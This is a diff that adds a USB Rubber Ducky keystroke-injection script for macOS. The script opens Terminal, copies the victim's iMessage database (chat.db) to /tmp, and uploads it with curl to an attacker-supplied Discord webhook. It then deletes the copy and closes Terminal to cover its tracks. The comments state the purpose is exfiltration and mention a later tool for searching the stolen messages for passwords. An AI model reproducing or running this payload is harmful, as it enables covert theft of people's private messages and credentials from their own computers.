@@ -1,0 +1,53 @@
+REM DUCKY MAC CHAT.DB EXFILTRATION VIA DISCORD WEBHOOK
+REM For Mac OS 
+REM CREATED BY ECTO-1A
+
+REM The chat.db is a database of all text messages sent via iMessage/Messages on the Mac.
+
+REM This script assumes that you have the "curl" command installed on your Mac. 
+REM You will need to replace <webhook URL> with the URL of the Discord webhook you want to use.
+REM Discord max webook file size is 8mb so this will only work with smaller chat.db files
+
+
+REM This script will open the terminal, navigate to the directory where the chat.db file is stored, 
+REM copy the file to the tmp directory, use curl to send the file to the Discord webhook, 
+REM delete the copy of the file from the tmp directory, and then close the terminal.
+
+
+REM I'm currently working on a python script to scan the chat.db for any potential passwords or other sensitive data.
+REM Should hopefully be ready by early 2023
+
+
+
+DELAY 1000
+GUI SPACE
+DELAY 200
+STRING terminal
+DELAY 200
+ENTER
+DELAY 800
+
+REM Get chat.db file from Mac
+
+STRING cd ~/Library/Messages
+ENTER
+DELAY 500
+STRING cp chat.db /tmp
+ENTER
+DELAY 500
+
+REM Use curl to send chat.db file to Discord webhook
+
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/chat.db" <webhook URL>
+ENTER
+DELAY 500
+
+REM Clean up
+
+STRING rm /tmp/chat.db
+ENTER
+DELAY 500
+
+REM Close terminal
+
+GUI Q
